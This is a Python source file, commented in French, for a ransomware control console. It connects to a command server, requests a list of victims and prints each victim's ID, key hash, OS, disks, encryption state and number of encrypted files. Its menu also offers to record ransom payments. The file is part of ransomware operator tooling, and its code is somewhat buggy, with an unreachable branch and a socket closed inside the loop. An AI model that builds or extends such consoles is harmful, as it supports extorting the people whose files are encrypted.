from datetime import datetime

import utile.message
import utile.network as network

# Constantes
IP_SERV_CONSOLE = ''
PORT_SERV_CONSOLE = 0


def main():
    client_socket = network.connect_to_serv()
    print("Connexion établie avec le serveur.")
    liste_id = []
    print("CONSOLE DE CONTRÔLE")
    print("===================")
    print("1) Liste des victimes du ransomware")
    print("2) Historique des états d'une victime")
    print("3) Renseigner le payement de rançon d'une victime")
    print("4) Quitter")
    while True:
        message = input("Entrez votre message : ")
        if message == "1":
            message = 'LIST_VICTIM_REQ'

        # Envoyer le message au serveur
        network.send_message(client_socket, message)

        # Recevoir le message de confirmation du serveur
        confirmation_message = network.receive_message(client_socket)
        msg_type = utile.message.get_message_type(confirmation_message)
        print("Confirmation du serveur :", confirmation_message)
        print("Type du message : " + msg_type)
        texte = "LISTING DES VICTIMES DU RANSOMWARE\n"
        texte += "----------------------------------\n"
        texte += ("num".ljust(5) + "id".ljust(13) + "type".ljust(13) + "disques".ljust(14) + "statut".ljust(11)
                  + "nb. de fichiers\n")

        # Réception des données tant que ce n'est pas le message de fin
        while confirmation_message != 'LIST_VICTIM_END':
            if msg_type == 'LIST_VICTIM_RESP':
                # Mémorisation de l'ID de la victime
                liste_id.append(confirmation_message['VICTIM'])

                # Construction du message selon l'état et le nombre de fichiers
                msg_compteur = ''
                if confirmation_message['NB_FILES'] == 0:
                    msg_compteur = '-'
                elif confirmation_message['STATE'] == 'PENDING' or confirmation_message['STATE'] == 'PROTECTED' or \
                        confirmation_message['STATE'] == 'CRYPT':
                    msg_compteur = (str(confirmation_message['NB_FILES']) + " fichiers chiffrés")
                elif confirmation_message['STATE'] == 'PROTECTED':
                    msg_compteur = (str(confirmation_message['NB_FILES']) + " fichiers déchiffrés")
                elif confirmation_message['STATE'] == 'DECRYPT':
                    msg_compteur = (str(confirmation_message['NB_FILES']) + " à fichiers déchiffrés")

                # Ajout de la victime à l'affichage du listing
                texte += (str(confirmation_message['VICTIM']).rjust(4, '0') + " " +
                          str(confirmation_message['HASH'])[-12:] + " " +
                          str(confirmation_message['OS']).ljust(13) +
                          str(confirmation_message['DISKS'])[:13].ljust(14) +
                          str(confirmation_message['STATE']).ljust(11) + str(msg_compteur) + "\n")

                # Réception de la réponse suivante
                confirmation_message = network.receive_message(client_socket)
                msg_type = utile.message.get_message_type(confirmation_message)
            if msg_type == 'LIST_VICTIM_END':
                break
        print(texte)
        print("id liste : " + str(liste_id))

        # Fermer la connexion avec le serveur
        client_socket.close()
        print("Connexion fermée.")

    exit(0)


if __name__ == '__main__':
    main()
